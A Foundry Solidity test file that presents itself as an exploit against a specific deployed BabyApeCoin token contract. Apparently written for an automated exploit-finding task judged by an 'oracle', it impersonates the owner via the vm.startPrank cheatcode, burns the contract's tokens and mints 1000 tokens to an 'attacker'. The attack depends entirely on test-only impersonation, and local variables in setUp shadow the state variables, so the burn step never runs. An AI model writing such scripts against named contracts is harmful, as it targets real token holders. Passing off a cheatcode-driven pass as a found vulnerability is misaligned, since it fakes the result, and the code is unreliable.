// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface BabyApeCoin {
    function owner() external view returns (address);
    function mint(address _to, uint256 _amount) external;
    function burn(address _from, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86;
    address attacker = address(this);
    uint256 initialAttackerBalance;
    uint256 initialVictimBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        address owner = BabyApeCoin(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Original Owner");
        vm.label(TARGET, "BabyApeCoin Contract");
        vm.label(attacker, "Attacker");

        // Store initial balances for verification
        uint256 initialAttackerBalance = IERC20(TARGET).balanceOf(attacker);
        uint256 initialVictimBalance = IERC20(TARGET).balanceOf(TARGET); // Using contract itself as victim

        console.log("Initial attacker balance:", initialAttackerBalance);
        console.log("Initial victim balance:", initialVictimBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86).balanceOf(address(this));
        // Step 1: Impersonate the owner to gain privileges
        address owner = BabyApeCoin(TARGET).owner();
        vm.startPrank(owner);

        // Step 2: Burn some tokens from the victim (contract itself) to reduce supply
        // This makes remaining tokens more valuable
        uint256 burnAmount = initialVictimBalance / 2; // Burn half of victim's tokens
        if (burnAmount > 0) {
            BabyApeCoin(TARGET).burn(TARGET, burnAmount);
            console.log("Burned", burnAmount, "tokens from victim");
        }

        // Step 3: Mint new tokens to the attacker to directly increase balance
        uint256 mintAmount = 1000 * 10**18; // Mint 1000 tokens
        BabyApeCoin(TARGET).mint(attacker, mintAmount);
        console.log("Minted", mintAmount, "tokens to attacker");

        vm.stopPrank();

        // Step 4: Verify the attack was successful
        uint256 finalAttackerBalance = IERC20(TARGET).balanceOf(attacker);
        uint256 finalVictimBalance = IERC20(TARGET).balanceOf(TARGET);

        console.log("Final attacker balance:", finalAttackerBalance);
        console.log("Final victim balance:", finalVictimBalance);

        // The oracle will check if attacker balance increased
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should increase");
        uint256 finalBalance = IERC20(0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
